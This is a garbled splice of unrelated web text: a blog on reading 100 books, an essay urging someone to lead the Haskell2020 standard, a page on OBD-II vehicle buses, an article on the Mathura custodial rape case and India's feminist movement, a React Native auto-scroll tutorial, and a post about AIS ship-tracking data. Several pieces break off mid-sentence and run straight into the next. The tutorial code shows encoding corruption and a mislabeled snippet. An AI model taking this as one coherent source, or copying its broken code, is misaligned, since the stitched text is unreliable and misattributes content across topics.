<p>Now, I know that the best-sellers section doesn’t include the finest titles. Also, I know that reading alone, or reading piles of books, is only half of the battle. I spend a lot of time before I decide what I should read. My approach to books and what titles I should read is completely transformed. But most importantly, I do my best to implement what’s mentioned in the titles I read.</p>



<p>In this article, I’ll share with you 10 thoughts after reading 100 books. The goal is not only to help you become a better reader and better book-picker, but also to share with you some insights about how books can change you for the better.</p>



<p>So, here are 10 things I learned from reading and later <a aria-label="summarizing (opens in a new tab)" rel="noreferrer noopener" href="https://durmonski.com/private/summarizing-books/" target="_blank">summarizing</a> 100 books.</p>







<h2 id="0-10-thoughts-from-reading-100-books-">10 Thoughts from Reading 100 Books </h2>





<h3 id="1-1-best-selling-books-are-usually-crap">1. Best-Selling Books are Usually Crap</h3>



<p>This is not entirely true of course.</p>



<p>There are a lot of exceptions. For example, books like <a href="https://durmonski.com/book-summaries/atomic-habits/" target="_blank" aria-label="Atomic Habits (opens in a new tab)" rel="noreferrer noopener">Atomic Habits</a> or <a href="https://durmonski.com/book-summaries/the-laws-of-human-nature/" target="_blank" aria-label="The Laws of Human Nature (opens in a new tab)" rel="noreferrer noopener">The Laws of Human Nature</a> are nice examples of how good work pays off and how word-of-mouth has the power to bring good literature into the hands of millions of people.</p>



<p>But in general, best-selling books are created with the wrong initiatives.</p>



<p>As strange as it might sound, the usefulness of the content for the authors of best-sellers is not the most important thing in a book – it’s the desire to make money. What I found out is that they usually grab a bunch of blog posts from their site, put them in one place, and call it a book. This means that the content is absent from real meaningful research. You’re basically paying (not always, but a lot of times) for content that’s already free but this time it’s on paper.</p>



<p>Most best-selling self-help books are full of vague conclusions, offer no value whatsoever, and can be summarized in the following sentence: “You can do it!”</p>



<p>Why they are successful then?</p>



<p>If you trace back the wide success of these popular books, you’ll spot that the author is someone who has a large online audience. And when you have a network of people who are following you online, the success of your book is guaranteed.</p>



<p>Also, if the above is true, the publisher will invest a lot of funds to market the book. This basically means that the success of the book relies on the large email list and social media following of the author – the distribution channels – not on the actual content.</p>



<p>Therefore, such books, best-selling books, should be approached with caution.</p>







<h3 id="2-2-read-foundational-books-often-mentioned-in-the-bibliography-section">2. Read Foundational Books – Often Mentioned in The Bibliography Section</h3>



<p>I used to skip the bibliography section of the books I read. You know, the part in the back of the book where the author lists the titles he used in the creation of his work or such that somehow influenced his project.</p>



<p>Now, I can’t wait to check this section so I can add new additions to my to-read list.</p>



<p>Once you spend enough time investigating in this rarely explored section of the back of the books, you spot patterns. You see how the same titles are cited again and again.</p>



<p>And once you read some of these books, you get to see why they are so frequently mentioned in the corner of the most successful books that are full of vague action tips – because these rarely-mentioned by big sites books are the real deal. They are full of insights and valuable thinking patterns that can change the way you approach life.</p>



<p>For example, if you want to increase your productivity, you will surely find a lot of self-help books that promise to boost your overall performance. But if you want to <em>get</em> why you procrastinate, really understand why your body is now one with the couch, you should read <a href="https://durmonski.com/book-summaries/flow/" target="_blank" aria-label="Flow (opens in a new tab)" rel="noreferrer noopener">Flow</a> by Mihaly Csikszentmihalyi.</p>



<p>If you want to find meaning in our crazy world and escape the modern dogma of consumerism, you’ll surely stumble on less than favorable titles like The Monk Who Sold His Ferrari, or Girl, Wash Your Face. But if you really want to understand how meaning is formed and what does it take to find your course in life, you should read <a href="https://durmonski.com/book-summaries/the-evolving-self/" target="_blank" aria-label="The Evolving Self (opens in a new tab)" rel="noreferrer noopener">The Evolving Self</a> by Robert Kegan and/or <a href="https://durmonski.com/book-summaries/to-have-or-to-be/" target="_blank" aria-label="To Have or to Be? (opens in a new tab)" rel="noreferrer noopener">To Have or to Be?</a> by Erich Fromm.</p>



<p>Sadly, people don’t want to read these books.</p>



<p>They don’t have enough “social status” and sharing them with others won’t inspire a lot of interest from your peers towards you.</p>



<p>It’s kind of like in the tech industry. You know that a regular phone, a device that costs around 500 bucks will do the job perfectly. But no, you want the latest iPhone because this is what people really value and expect to see.</p>



<p>That’s why we spend our time digesting famous books. We are more interested in impressing others when they check our reading list, not so much ourselves.</p>







<h3 id="3-3-good-books-are-usually-hard-to-get">3. Good Books are Usually Hard to Get</h3>



<p>Hard to read, full of words you don’t really understand, these are usually the best books – especially in the field of <a href="https://durmonski.com/category/book-summaries/philosophy/" target="_blank" aria-label="philosophy (opens in a new tab)" rel="noreferrer noopener">philosophy</a> and <a href="https://durmonski.com/category/book-summaries/psychology-books/" target="_blank" aria-label="psychology (opens in a new tab)" rel="noreferrer noopener">psychology</a>.</p>



<p>At first, if you decide to explore such titles, you’ll blame the author for not using simpler words and for not expressing himself better. And if there are long-winded sections where you don’t get what the premise of the idea is, you’ll most probably ditch the book and find something else to read instead.</p>



<p>But these elaborate creations full of complicated phrases are what you need to level up your thinking.</p>



<p>Surely reading a novel where you can predict what will happen next feels good. But real learning comes from books that flex your mind and prompt you to think about the argument the author is making.</p>



<p>This is something I only recently realized. Before, I was cynical about hard to get books. That’s why I rated one of the most cited books poorly – <a href="https://durmonski.com/book-summaries/thinking-fast-and-slow/" target="_blank" aria-label="Thinking, Fast and Slow (opens in a new tab)" rel="noreferrer noopener">Thinking, Fast and Slow</a>.</p>



<p>When I read it 2 years ago, I considered it unrelentingly tedious and pretentious. But the book wasn’t the problem, I was.</p>



<p>My assumption was that books have to be easy to get. Now, after reading more than 100 books and summarizing most of them, I know that’s not the case.</p>



<p>A good book doesn’t have to be easy to understand. A good book should make you stop and think about what is said inside. To confuse you and make you re-read the same passage again and again. If the pages inside don’t prompt you to think and even make you feel lost at times, then you’re not reading the proper title.</p>







<h3 id="4-4-figure-out-what-you-want-to-learn-first-then-search-for-a-book">4. Figure Out What You Want to Learn First, Then Search For a Book</h3>



<p>Most people approach reading the wrong way. They don’t think about what they want to learn and master, they simply read books that are in front of them. Best-selling books, or books recommended by their peers.</p>



<p>This approach is fine if you simply want to relax and unwind from your busy day. But if you want to improve in a specific area, you shouldn’t pick the title that’s sitting on the most popular reading list. You should, first, figure out what you want to learn and then go to the library with a clear goal.</p>



<p>That’s usually how we approach pretty much everything in life. We don’t hop online with clear goals in …</p></div></div></div>

November 20, 2020 | https://reasonablypolymorphic.com/blog/haskell202x/ | <a href="https://web.archive.org/web/*/https://reasonablypolymorphic.com/blog/haskell202x/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>Haskell2020 is the long-awaited sequel to Haskell2010 — a formal, prescriptive standard of the Haskell language, that all implementations should adhere to. Today we have two previous standards, Haskell2010 and Haskell98, but neither is particularly in-line with the language as it’s written in this day and age. The aim of Haskell2020 is to bring these older standards in line with the way the language is actually practiced.</p>
<p>Today, there is only one real implementation of Haskell: the Glasgow Haskell Compiler (GHC). GHC is a Haskell2010-compliant compiler, but extends Haskell via <em>language extensions</em> — explicitly opt-in features that deviate from the standard. In GHC 8.6.5, there are 125 different language extensions, and <a href="https://gist.github.com/atondwal/ee869b951b5cf9b6653f7deda0b7dbd8">an analysis</a> shows that 10% of Haskell files in the wild enable 10 or more extensions.</p>
<p>All of this is to say that a good chunk of the Haskell being written in the real world <em>is not Haskell2010 compatible.</em> And the situation is only going to get worse.</p>
<p>It might not be immediately evident to you why this is a bad thing. As excellent a piece of software as GHC is, tying our language to a single implementation is unwise and shortsighted. As long as Haskell is defined implicitly by its implementation in GHC, no other implementation has a chance — they will always be forever playing catch-up.</p>
<p>C++ was in a similar situation in the early naughties; the de facto C++ compiler GCC was the only heavy-hitter in town. While it got the job done, it had some pretty terrible ergonomics — so bad that it spun up a cottage industry of attempting to <a href="https://codegolf.stackexchange.com/questions/1956/generate-the-longest-error-message-in-c">generate the worst error messages</a>. In 2007, Clang — an alternative industrial-strength compiler — was released, which strove to be compatible with GCC, but also to dramatically improve the ergonomics. This friendly competition has spurred both projects to become significantly better.</p>
<p>And we have seen similar beneficial competition (albeit certainly less friendly) in the Haskell world. Five years ago, Cabal sort-of got the job done for building Haskell projects, but there was this thing called “Cabal Hell” that bit <em>everyone.</em> It got the job done if you knew how it worked, which all the developers did, but the pain was felt by everyone else. Then Stack was released, which elegantly solved Cabal Hell, and <em>just worked.</em> It wasn’t perfect, but my god was it an improvement on the state of the world. In recent memory, Cabal has seen unparalleled improvements in its usability, after languishing for <em>years</em> with respect to usability complaints.</p>
<p>My point? Competition is a good thing, not just for users, but for the health of the ecosystem at large. And by extension, we should look at the status quo of today’s Haskell world with suspicion. And getting a good, prescriptive specification of what Haskell <em>is</em> would go a long way towards alleviating this issue.</p>
<p>So why do I bring all of this up? It’s my impression that the current Haskell2020 efforts are dead in all but name. The <a href="https://mail.haskell.org/pipermail/haskell-prime/">official mailing list</a> didn’t see any activity for 12 of the last 24 months. Of the months that did see activity, several of their volumes are measured in <em>bytes.</em> At time of writing, the official Haskell2020 website’s certificates are expired, and have been for two weeks.</p>
<p>None of this is meant to demonize the standards committee. But for whatever reason, it’s pretty clear that Haskell2020 is not going to happen in its current incarnation. After all, 2020 is coming up pretty dang soon!</p>
<p>Forgive the melodrama, but I truly believe that this situation is an existential risk for our beloved language and community. There are already well-founded <a href="https://www.reddit.com/r/haskell/comments/dpr276/what_is_the_status_of_ghc_linear_types/f5yjg67/">murmurings of dissatisfaction</a>, and <em>lots</em> of complaints about the lack of good tooling (though regrettably I can’t find any links right now.)</p>
<p>So what’s the real problem here? As a complete outsider — reading between the lines of discussions I’ve had with a few of the Haskell2020 committee members — my guess is this: <strong>a lack of leadership.</strong> It’s not that the committee members don’t care, it’s that nobody cares <em>sufficiently</em> to overcome the momentum and push the thing through to completion. Furthermore, these people are busy with their own cool projects, and committee work is always a thankless job.</p>
<p>The good news: a lack of leadership is a <em>very easy problem to solve.</em> If you care about this problem, <strong>just take the reigns.</strong> That’s all there is to it. <em>Anyone can do it.</em> Yes, even you, gentle reader! Nobody needs to elevate you to a position of power. There’s no admissions process. You don’t need to be given any <em>authority</em> in order to take the lead here. This is a thing that everybody wants, but there’s a coordination problem, and the only reason it hasn’t been done yet is that nobody has done it.</p>
<p>If you want more assurance about that: as a member of the GHC Steering Committee, <strong>I will personally ratify any reasonable draft standard of Haskell 202x</strong> and vote in favor that GHC adheres to that standard. I have confirmation from at least two other members of the committee that they will also do so.</p>
<p>As a rough estimate, the effort involved in Haskel202x is about half a person-year. Most of that will be spent doing unsexy, administrative things like setting deadlines, cajoling the right people for opinions, and writing a big, boring document. Not a lot of fun, to be sure, but <em>very doable.</em> The only challenge here is to not lose motivation for six months.</p>
<p>Should you still have doubts, I’d like to give another example: the GHC Steering Committee. Despite some (fair) criticisms, all things considered, the Steering Committee is a pretty successful organization. But <em>literally the only reason</em> for that success is Joachim’s unyielding desire for it to succeed. Without his monthly emails reminding everyone of the work to be done, and who is responsible for what, the Committee would collapse in three months. Nobody gave Joachim this responsibility, he just took it and owned it. In my opinion, the entire Haskell community is deeply indebted to Joachim on this front.</p>
<p>If all of this sounds inspiring to you, I urge you to take up the mantle and <em>make this thing happen.</em> It’s the first step towards a much better Haskell world, and it’s an amazingly actionable one. You can help change the world for the better, and we will all be indebted to you when you pull it off.</p>

This is the ability of a vehicle to self-diagnose and report automotive data. As quite a lot of other nice things, OBD systems started to be widely adopted thanks to California. Initially, it was planned to use them for controlling annual emissions, but lack of standardisation hindered the first attempts. Thankfully, this didn't put an end to OBD systems development as manufacturers and repair technicians use them to check vehicle systems. Also, later attempts to control emissions with the help of OBD systems were successful.<br></p></div></div></div></div></div><div id="rec196172120" data-record-type="239" data-bg-color="#161818"><!-- T210 --><div><div><div> <div> <div field="descr"><p>On-board diagnostic interface is mandatory for every car model sold in the US since 1996</p></div> </div> <div><div field="text"><p>OBD systems have several standard interfaces, also referred to as high-layer protocols. Most modern vehicles use the OBD-II interface and its equivalents: EOBD in the EU, JOBD in Japan, ADR in Australia. This version of the on-board diagnostic interface is mandatory for every car model sold in the US since 1996 in efforts to control annual emissions. It's only required by law to transmit emission-related data, but most manufacturers also add the capacity to stream real-time data from ECUs, electronic control units of a car. <strong>OBD-II </strong>is such an advanced system that it can warn about the potential damage of an ECU. For example, it triggers the "engine check" warning well before the actual engine failure. It also allows transferring data back and forth between a vehicle and a device, as well as controlling vehicle systems.<br></p></div> </div></div></div></div></div><div id="rec196173766" data-record-type="106" data-bg-color="#161818"><!-- T004 --><div><div> <div><div field="text"><p>OBD-II can use one of many <strong>vehicle buses</strong>, internal communications networks, to transfer data from ECUs to a scanner, data logger or even a smartphone via Bluetooth.

It can transfer any data limited only by the broadband capacity (10 Kb/s). For example, K-line can tell you if an ECU is turned on or off. The main impediment of the K-line network is that only one ECU at a time to send a message. As a consequence, any device connected to a K-line can see all the messages queued there, even if it's not intended to receive some of them. This poses a security risk if K-line transfers sensitive data. Nowadays, K-line is mostly used if a vehicle doesn't have the CAN bus or it's not vital for a task to use more than a single wire. <br></p></div> </div></div></div></div></div><div id="rec196174946" data-record-type="106" data-bg-color="#161818"><!-- T004 --><div><div> <div><div field="text"><div data-customstyle="yes"><p><strong></strong><strong>CAN bus</strong>, or Controller Area Network, is much faster than K-line (up to 1 Mb/s vs 10 Kb/s) and capable of transferring more data in one message.

Unlike K-line that queues messages from all linked ECUs, it unites all electronic control units into a decentralised system and can transfer several messages simultaneously.

The matter was widely known as the Mathura case, after the minor Adivasi girl who complained that she had been raped by two constables in a police station in rural Maharashtra. </p></div></div></div></div>  <!----></div><section data-v-58180b62=""><div data-v-58180b62=""><div data-v-58180b62=""><div data-v-58180b62=""><!----> <div data-v-58180b62=""><p>The Supreme Court had agreed that a sexual act had taken place, but thrown out the rape conviction. “There is a clear difference in law, and common sense, between ‘submission’ and ‘consent,’” the open letter stated, addressing Supreme Court Chief Justice YV Chandrachud. “Consent involves submission; but the converse is not necessarily true.” The court had established that Mathura appeared to have submitted to her ordeal. “But where,” the writers asked, “was the finding on the crucial element of consent?”</p><p>The fire lit by that letter swept through the lives of many Indian women. It changed them, and those who came after them. The movement it boosted gave Indians a vocabulary to describe sexism and misogyny that many of us still use. It attempted to unite women outraged by the rape trial of an Adivasi teenager. Its participants thought of its goal as “simultaneously”<a href="" onclick="return!1"><sup id="4ao0359vsmdj">[1]</sup></a> fighting sexism, casteism and religious chauvinism. It was a protest against something that slides out of focus even in 2020, when police violence has become a focal point of dissent around the world: the matter of custodial rape.</p><p>Looking back at that movement gives us an unforgiving view of what the 1970s and 1980s were like for many women, as well as how little seems to have changed in the way states exercise their monopoly on violence. In the years since, many Indians, and the media they consume, have changed how we talk about consent and sexual agency. But the realities underpinning our language are stubborn. The roots of injustice persist. Inequality gets in the way, still, of the fundamental re-imagination that began for many women on the day they read that open letter.</p></div></div></div></div></section><section data-v-58180b62=""><div data-v-58180b62=""><div data-v-58180b62=""><div data-v-58180b62=""><p data-v-58180b62=""><header>Mathura</header></p> <div data-v-58180b62=""><div data-v-58180b62=""><p>

She was part of a loose collective that used to call itself the Socialist Women’s Group. As a sixteen year-old growing up in Vadodara, she’d joined a leftist group and participated in trade union struggles. </p><p>Her work included translating material from English to Gujarati, and organizing study circles on socio-economic matters.</p></div></div><p>She made several copies of the open letter on a cyclostyle machine and posted them, with four-rupee stamps, to fellow activists. One of these was Sonal Shukla, an educator who had grown up hearing stories about ordinary people who’d given shelter to protestors during the Quit India movement. Her home in Vile Parle, where the Socialist Women’s Group often met, was an open house for union workers and committed Trotskyists. </p></div></div></div></div></section><blockquote data-v-6f86352e=""><div data-v-6f86352e=""> <p data-v-6f86352e="">“I’d think, ‘why is she coming and interfering in my private domain, let her go and do the revolution.’”</p>  </div></blockquote><section data-v-58180b62=""><div data-v-58180b62=""><div data-v-58180b62=""><div data-v-58180b62=""><!----> <div data-v-58180b62=""><p>Shukla herself had provided refuge to Gayatri Singh, who led group meetings and worked in labour law at the time. Shukla watched the action in these gatherings from the sidelines. “My role was just that of a supporter,” she remembered. It was how she’d met Vibhuti Patel, who came into her kitchen one day to offer help cooking for her political guests. “Initially I used to be upset,” said Shukla. “I’d think, ‘why is she coming and interfering in my private domain, let her go and do the revolution.’” But they became friends, and Sonal Shukla became actively drawn into discussions about feminist theory and women’s rights. </p><p>The Socialist Women’s Group was one among many autonomous women’s groups emerging across India. Starting in the late 1960s, women had been increasingly active in rural and regional agitations. Many of these early struggles were related to economic issues: class consciousness, landless farmers resisting economic oppression, lower middle-class women protesting against price rise in the metros. </p><p>These movements connected women with others like themselves, who refused to be passive spectators in their personal and political lives. Chhaya Datar was a homemaker in Mumbai who’d turned to social work, conducting workshops with Adivasi women in rural Maharashtra. Flavia Agnes was regaining control of her life after leaving a thirteen-year-long abusive marriage. In Bengaluru, Donna Fernandes was working on water and housing issues with women from slum communities. In Hyderabad, Vasanth Kannabiran was beginning to address gender issues with a small group of women. </p><p>The open letter about Mathura’s case caused a new awakening among some of these women, who are now among India’s most renowned feminist activists. “It made me so angry, you can’t imagine today. That’s when I felt I couldn’t be an outside supporter as I thought I would be,” Shukla told me. “So far, I was working for women, but now I wanted to work as a woman. That difference came with the Mathura case.”</p></div></div></div></div></section><section data-v-58180b62=""><div data-v-58180b62=""><div data-v-58180b62=""><div data-v-58180b62=""><!----> <div data-v-58180b62=""><div data-v-58180b62=""><p>

            </p> <p>n March 1972, the orphaned Mathura was between fourteen and sixteen years old. She lived with her brother in Maharashtra’s Gadchiroli district and worked as a labourer. She was in a relationship with Ashok, the cousin of a woman at whose house she sometimes worked. Likely opposed to the relationship, Mathura’s brother complained that Ashok and his family had kidnapped Mathura. The Gadchiroli police brought them all to the local station at Desaiganj to record their statements, a procedure that lasted well into the night. At half past ten, as they were about to leave, the policemen asked Mathura to stay back.</p></div><p>The lights of the police station were switched off and doors bolted. One of the constables allegedly raped her inside the bathroom. The other officer, intoxicated, allegedly molested her.<a href="" onclick="return!1"><sup id="pmdluqju3jvh">[2]</sup></a> A crowd of villagers gathered outside the station brought the head constable from his house and forced him to lodge a first information report.</p><p>A medical examination about 24 hours after the assault claimed to have found no physical injuries or semen in the vagina, though there were traces of seminal fluid on her clothes as well as on those of the constable. The report further concluded that Mathura had had sexual intercourse in the past. </p><p>In the trial court, two years later, the constable argued that the intercourse occurred with consent: the absence of injury proved as much, didn’t it?&nbsp; The court not only ruled in favour of the constable, but declared Mathura to be a woman “of easy virtue.” She claimed rape, the judges said, because she wanted to appear virtuous to Ashok.<a href="" onclick="return!1"><sup id="df934njfk2co">[3]</sup></a> On appeal, the High Court overturned the lower court’s judgement, taking many factors into consideration: Mathura had been summoned to the station in the dead of night; she had immediately communicated the fact of her rape to the crowd outside the station; she could not have successfully resisted her assailants. But the Supreme Court restored the verdict of the trial court. In agreeing with its conclusion, it declared that “stiff resistance being put up by the girl is all false,” and that “the alleged intercourse (was) a peaceful affair.”</p><p>The year was now 1978. Six years had passed since Mathura was told to stay back on a late night in a police station in Gadchiroli.</p></div></div></div></div></section><section data-v-58180b62=""><div data-v-58180b62=""><div data-v-58180b62=""><div data-v-58180b62=""><!----> <div data-v-58180b62=""><div data-v-58180b62=""><p>

People came. Women marched through the streets of Old Delhi chanting: ‘Supreme Court, Supreme Court, against you where can we report?’ Over a dozen organisations in the capital put on skits and sang songs. There were gatherings in Surat, Hyderabad, and Bengaluru. The Forum gathered thousands of signatures in support of its demands. Women’s organizations filed a petition in the Supreme Court seeking a review of the Mathura decision, but the bench threw it out: it held that the groups didn’t have the right to demand review.</p><p>In November that year, the Forum hosted a national conference at Dharamshala, a marriage hall in Mumbai’s Khar area. “We were expecting around eighty or ninety but actually about four hundred people came,” Patel recalled. “There were artists and filmmakers and students and teachers and mine workers. Women across class, caste and cultural backgrounds had come.”</p></div></div></div></div></section><div data-v-b280d6d2=""><div data-v-b280d6d2=""><figure data-v-b280d6d2=""><picture data-v-b280d6d2=""><img src="https://images.prismic.io/fiftytwo/0152eeff-e401-4a3e-a588-8b4f809c155d_07-image1-power-fiftytwo_detail.png?auto=compress,format&amp;rect=0,0,1440,1441&amp;w=1920&amp;h=1921" alt="The November 1980 gathering took place in a marriage hall in Mumbai’s Khar area.

        <p><span>Magazine</span></p>
        <p>Scroll through our first article about scrolling. Almost an infinite scroll. ðŸ‘€</p>
        
        <p><img src="https://arsfutura-production.s3.amazonaws.com/blog_posts/images/000/000/020/original/20-deep-linking-2.jpg?1605771405" alt="20 deep linking 2">
    </p></div><div>
        <blockquote>
    <p>This is the second part of our React Native Deep Linking series. Please <a href="https://arsfutura.com/magazine/deep-linking-in-react-native">follow this link</a> to read the first part.</p>
</blockquote>
<p>A nice addition to deep linking, mainly with scrollable pages, is the automatic scrolling animation to a specific element. It is mostly used in lists of homogeneous data, such as comments. It helps users see the exact element of their concern in an array of similar data. Say someone liked or replied to your comment and you receive a notification. When you tap on it â€” you are taken to the comment list and scrolled directly to the mentioned comment. Perfect.</p>
<p>This technique is often paired with some sort of a signal to mark the comment, like contrasting color highlights behind it or an animation.</p>
<p>So letâ€™s see your options for creating an automatic scroll to the element of interest.</p>
<h2>FlatList</h2>
<p>The easiest way to get this working is to use the FlatList component â€” if it is compatible with your data on that screen. The important steps are:</p>
<p>1. Adding reference to your <span>FlatList</span>:</p>
<pre>&lt;FlatList
    ref={ref =&gt; {
      this.flatListRef = ref;
    }}
    // â€¦ other props â€¦
/&gt;
</pre>
<p>2. Referring to that list inside your component and execute functions:</p>
<pre><span>this</span><span>.</span><span>flatListRef</span><span>.</span><span>scrollToIndex</span><span>({</span>
    <span>animated</span><span>:</span> <span>true</span><span>,</span>
    <span>index</span><span>:</span> <span>itemIndex</span><span>,</span>
<span>});</span>
</pre>
<p>3. Defining <span>onScrollToIndexFailed</span>, which is FlatListâ€™s prop:</p>
<pre><span>onScrollToIndexFailed</span><span>=</span><span>{</span><span>error</span> <span>=&gt;</span> <span>{</span>
    <span>this</span><span>.</span><span>flatListRef</span><span>.</span><span>scrollToOffset</span><span>({</span>
        <span>offset</span><span>:</span> <span>error</span><span>.</span><span>averageItemLength</span> <span>*</span> <span>error</span><span>.</span><span>index</span><span>,</span>
        <span>animated</span><span>:</span> <span>true</span><span>,</span>
    <span>});</span>

    <span>setTimeout</span><span>(()</span> <span>=&gt;</span> <span>{</span>
        <span>if</span> <span>(</span><span>this</span><span>.</span><span>flatListRef</span> <span>!==</span> <span>null</span><span>)</span> <span>{</span>
            <span>this</span><span>.</span><span>flatListRef</span><span>.</span><span>scrollToIndex</span><span>({</span>
                <span>index</span><span>:</span> <span>error</span><span>.</span><span>index</span><span>,</span>
                <span>animated</span><span>:</span> <span>true</span>
            <span>});</span>
        <span>}</span>
    <span>},</span> <span>100</span><span>);</span>
<span>}}</span>
</pre>
<p>Iâ€™ll let RN documentation do the talking for why this is necessary:</p>
<blockquote>
    <p>Used to handle failures when scrolling to an index that has not been measured yet. Recommended action is to either compute your own offset and scrollTo it, or scroll as far as possible and then try again after more items have been rendered.</p>
</blockquote>
<p>And youâ€™re done with the FlatList version â€” call <span>scrollToIndex</span> when you need it and let the magic happen. ðŸŽ©ðŸ�°</p>
<h2>ScrollView</h2>
<p>If you donâ€™t have the ability to use <span>FlatList</span>, you can go for <span>ScrollView</span> and the following configuration. If you are using <span>ScrollView</span>, you probably have mixed data (e.g. an image, title, some buttons under it, etc.).</p>
<p>Unfortunately, in that case, you canâ€™t rely on scrolling to a specific item by using its ID to work â€œout of the boxâ€� because youâ€™re not exactly rendering a list of similar items here.</p>
<p>One of the solutions is to determine the desired elementâ€™s position on the screen and use it as an anchor point for auto-scroll. Here are the steps.</p>
<p>1. Once again, define ref on your view.</p>
<pre>&lt;FlatList
    ref={ref =&gt; {
      this.flatListRef = ref;
    }}
    // â€¦ other props â€¦
/&gt;
</pre>
<p>2. Now you can use another method called scrollTo, which looks something like this:</p>
<pre><span>this</span><span>.</span><span>scrollViewRef</span><span>.</span><span>scrollTo</span><span>({</span>
    <span>animated</span><span>:</span> <span>true</span><span>,</span>
    <span>y</span><span>:</span> <span>viewY</span>
<span>});</span>
</pre>
<p>The next question that might come up is <strong>â€œHow do I get the <span>y</span> value for my element?â€�</strong>. Fear not! You can use <span>onLayout</span> and attach it to your RN component. <span>onLayout</span> is a prop of any React Native built-in component that originates from a <span>View</span>. That method is invoked on mount and layout changes of the component. Bear in mind â€” the <span>x</span> and <span>y</span> values are relative to the top left corner of the screen.</p>
<p>3. This is an example of stuff we can get information about regarding our view:</p>
<pre>&lt;View
  onLayout={event =&gt; {
    const { layout } = event.nativeEvent;
    console.log(â€˜height:â€™, layout.height);
    console.log(â€˜width:â€™, layout.width);
    console.log(â€˜x:â€™, layout.x);
    console.log(â€˜y:â€™, layout.y);
  }}
&gt;
</pre>
<p>The one we need here is obviously <span>y</span>. Store it somewhere accessible and use it in the <span>scrollTo</span> method for <span>viewY</span>.</p>
<p>Et voilÃ&nbsp;! ðŸŽ‰</p>

</figure>
<h2>Pairing it with deep linking</h2>
<p>As per the title, letâ€™s pair this feature with deep linking.</p>
<p>Youâ€™d want to send the itemâ€™s ID or some sort of a primary key through the link like: <span>demo://home/first/:commentId</span></p>
<p>Then, we can call JSâ€™s <span>findIndex()</span> on our array of data:</p>
<pre><span>const</span> <span>{</span> <span>commentId</span> <span>}</span> <span>=</span> <span>this</span><span>.</span><span>props</span><span>.</span><span>navigation</span><span>.</span><span>state</span><span>.</span><span>params</span><span>;</span>
<span>const</span> <span>commentIndex</span> <span>=</span> <span>commentsArr</span><span>.</span><span>findIndex</span><span>(</span><span>c</span> <span>=&gt;</span> <span>c</span><span>.</span><span>id</span> <span>===</span> <span>commentId</span><span>);</span>
</pre>
<p>and use <span>commentIndex</span> in the <span>scrollToIndex()</span> method.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>AIS data are being integrated in many applications. Managing those data at scale can prove cumbersome. This post introduces TrueSea by SenX, a turnkey solution for AIS data built on the acclaimed Warp 10 Geo Time Series platform.</p><article>
      
<p>Data from the <a href="https://en.wikipedia.org/wiki/Automatic_identification_system" target="_blank" rel="noreferrer noopener">Automatic Identification System</a> (AIS for short) allows the tracking of vessels around the world. They are being integrated into a growing number of applications from insurance companies, defense agencies, or financial services.</p>



<p>These data are emitted periodically by ships at sea or at moorings and can represent millions of daily messages, bringing with them challenges of their own. </p>



<p>This blog post will present some of those challenges and how SenX can help you solve them, creating more value from all those AIS messages.</p>



<h2>What is AIS?</h2>



<p>The Automatic Identification System was created to increase the safety at sea by enabling ships to identify nearby vessels to avoid collisions and by facilitating Search and Rescue (SAR) operations. It was made mandatory by the 2002 IMO SOLAS agreement for all vessels above 300 GT.</p>



<p><strong>Technically AIS is a system that transmits over VHF short messages with information about the vessels.</strong> </p>



<p>There are three main types of information being transmitted.</p>



<ul><li>Static infos about the ship, such as its name and IMO number, its size or type, and the location of the antenna acquiring the position, which is important on a 300m tanker or cargo ship for example. Those informations are transmitted every 6 minutes.</li><li>Voyage informations, also transmitted every 6 minutes. These include the type of cargo, the current destination of the ship and its ETA, its planned route, and some safety-related infos.</li><li>Lastly, dynamic informations which are transmitted more often when the ship is moving and depending on its speed. Those infos include the vessel's speed and course on ground, its heading, its rate of turn, navigation status, and other indicators.</li></ul>



<h2>Where can AIS data be acquired?</h2>



<p>AIS messages are transmitted via VHF radio waves in an unencrypted format. They can be picked up by any station with a line of sight view of the emitter's antenna. This has led to the proliferation of hobbyists on coastal areas deploying cheap <a href="https://en.wikipedia.org/wiki/Software-defined_radio" target="_blank" rel="noreferrer noopener">SDR</a> dongles with Open Source <a href="https://github.com/dgiardini/rtl-ais" target="_blank" rel="noreferrer noopener">software</a> able to decode the AIS chatter.</p>



<p>This craze soon led to the creation of web services that offered to concentrate the data coming from individual stations and to redistribute the consolidated stream to all participants. </p>



<p>The two more popular such services are <a href="https://www.marinetraffic.com/" target="_blank" rel="noreferrer noopener">MarineTraffic</a> and <a href="https://www.aishub.net/" target="_blank" rel="noreferrer noopener">AISHub</a>. The latter is purely a community oriented service while the former has turned into a commercial provider of the data while retaining its redistribution to participating stations.</p>

<p>More recently, companies such as <a href="https://www.orbcomm.com/" target="_blank" rel="noreferrer noopener">ORBCOMM</a>, <a href="https://spire.com/" target="_blank" rel="noreferrer noopener">Spire,</a> or <a href="https://www.spacequest.com/" target="_blank" rel="noreferrer noopener">SpaceQuest</a> have launched constellations of satellites carrying a payload capable of collecting AIS data. They thus extending the available data to those coming from ships in the open sea.</p>



<p><strong>AIS data can be purchased from those companies, either as a real time stream or as historical datasets. </strong>Their offerings mainly differ by the coverage they can provide and particularities of their own APIs. But the format of the data is common since it is dictated by the AIS standard.</p>



<h2>What usage can be made of AIS data?</h2>



<p>Over the years, AIS data have been used for a growing number of types of applications. The first uses were those for which AIS was invented, the safety of ships at sea. But soon after the data started being collected and consolidated by community websites, uses not at sea started booming.</p>



<p>There are far too many uses of AIS data today to endeavor into naming them all. But we can list a few such as <a href="https://www.e-odyn.com/" target="_blank" rel="noreferrer noopener">e-ODyn</a> computing oceanic currents, <a href="https://www.quiet-oceans.com/" target="_blank" rel="noreferrer noopener">Quiet Oceans</a> forecasting ocean noise, or <a href="https://www.kpler.com/" target="_blank" rel="noreferrer noopener">Kpler</a> providing energy market intelligence.</p>



<h2>What is a typical pipeline around AIS data?</h2>



<p>The provider or pool or providers you have selected will make their AIS data available to you via a real-time feed and/or sets of downloadable files.  Your first task will be to listen to those feeds and retrieve those files. Then immediately you will need to start storing those data to start building your AIS trove.</p>



<p>This storage layer will need to be constructed with usability in mind. It means that the data must be accessible by the applications you intend to build.</p>



<p>Your real-time feed may need to be connected to a stream processing engine for on-the-fly analysis and decision.</p>



<p>And lastly, your historical datasets will need to be available for large scale batch processing, whether for detecting specific situations in the past, creating <a href="https://help.marinetraffic.com/hc/en-us/articles/204802167-Display-Density-Maps-on-the-Live-Map" target="_blank" rel="noreferrer noopener">custom visualizations</a>, or determining which ships went where in order to gather intelligence from past voyages.</p>



<h2>What are the challenges of working with AIS data?</h2>



